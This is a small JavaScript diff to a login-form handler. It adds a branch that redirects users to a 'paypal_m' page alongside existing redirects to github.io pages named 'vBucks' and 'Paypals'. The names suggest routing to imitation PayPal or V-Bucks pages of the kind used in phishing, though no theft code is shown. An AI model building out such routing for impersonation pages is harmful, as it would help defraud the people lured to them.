@@ -14,6 +14,8 @@ loginForm.addEventListener('submit', function (e) {
             window.location.href = 'https://jongaha.github.io/vBucks/';
         } else if (version === 'paypal'){
             window.location.href = 'https://jongaha.github.io/Paypals/';
+        } else if (version === 'paypal_mobile'){
+            window.location.href = 'https://jongaha.github.io/paypal_m/';
         }
     } else {
         alert('Wrong password. Please try again.');
